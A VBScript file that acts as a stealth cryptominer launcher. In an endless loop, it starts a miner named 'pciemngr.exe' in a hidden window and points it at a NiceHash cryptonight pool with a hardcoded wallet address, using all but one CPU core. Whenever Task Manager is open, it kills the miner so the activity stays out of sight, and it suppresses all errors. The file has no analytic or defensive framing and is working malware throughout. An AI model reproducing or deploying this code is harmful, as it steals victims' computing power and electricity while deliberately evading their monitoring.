Set WshShell = CreateObject("WScript.Shell") 
Set WshShell = Nothing

On error resume next
Set WshShell = WScript.CreateObject("WScript.Shell")
Set objWMIService = GetObject("winmgmts:\\.\root\cimv2")

' Cores Counting
Const wbemFlagReturnImmediately = &h10
Const wbemFlagForwardOnly = &h20
strComputer = "."

   Set objWMIService = GetObject("winmgmts:\\" & strComputer & "\root\CIMV2")
   Set colItems = objWMIService.ExecQuery("SELECT * FROM Win32_Processor", "WQL", _
                                          wbemFlagReturnImmediately + wbemFlagForwardOnly)
cores = 0
For Each objItem In colItems
    cores = cores + objItem.NumberOfLogicalProcessors
Next
cores = cores - 1
' General Launching and Checking
do
WScript.Sleep 500
' Task Manager
Set taskcolitem = objWMIService.ExecQuery("Select * from Win32_Process")
taskmgrisrun=false
For Each objItem in taskcolitem
If objItem.Name = "Taskmgr.exe" OR objItem.Name = "taskmgr.exe" Then
taskmgrisrun = True
Exit For
End If
Next
' End Task Manager
Running = False
Set colItems = objWMIService.ExecQuery("Select * from Win32_Process")
For Each objItem in colItems
If objItem.Name = "pciemngr.exe" Then
Running = True
Set thisprocess=objItem
Exit For
End If
Next
If taskmgrisrun Then
    If Running Then
        thisprocess.Terminate
    End if
    If Not Running Then
        Running=True
    End if
End if
If Not Running Then
    WScript.Sleep 500
    WshShell.Run "pciemngr.exe -o stratum+tcp://cryptonight.eu.nicehash.com:3355 -u 12VdjBFsJYK6wBgCimmQyeix4UUJtZ7XaV -p x -t " & cores, 0
End if
Loop